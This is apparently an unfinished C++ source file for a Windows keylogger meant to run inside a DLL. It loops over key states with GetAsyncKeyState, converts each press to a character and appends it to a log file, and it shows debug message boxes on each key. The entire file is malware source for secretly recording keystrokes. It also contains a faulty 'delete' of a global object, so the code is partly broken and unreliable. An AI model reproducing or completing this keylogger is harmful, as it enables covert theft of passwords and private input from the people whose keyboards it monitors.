#include "keylogger.h"
#include "utils.h"
using namespace std;

// indicate keylogger state (used in the loop)
// set to false when DLL is unloading
bool IsKeyLoggerRunning = false;

LogFile log_file;

void KeyLoggerLoop()
{
	MessageBoxA(0, "PRESSED SOMETHING", "KEY", MB_OK);
	char key[2];
	while (IsKeyLoggerRunning)
	{
		for (int i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
			
				key[0] = (char)MapVirtualKeyA(i, MAPVK_VK_TO_CHAR);
				key[1] = 0;
				MessageBoxA(0, key, "KEY", MB_OK);
				log_file.AppendString((char*)key);
			}
		}
		Sleep(100);
	}
}

void StopKeyLogger()
{
	IsKeyLoggerRunning = false;
}

void StartKeyLogger()
{
	// do initialization code
	IsKeyLoggerRunning = true;
	
	// finally loop
	KeyLoggerLoop();

	// do finalization code
	delete &log_file;
}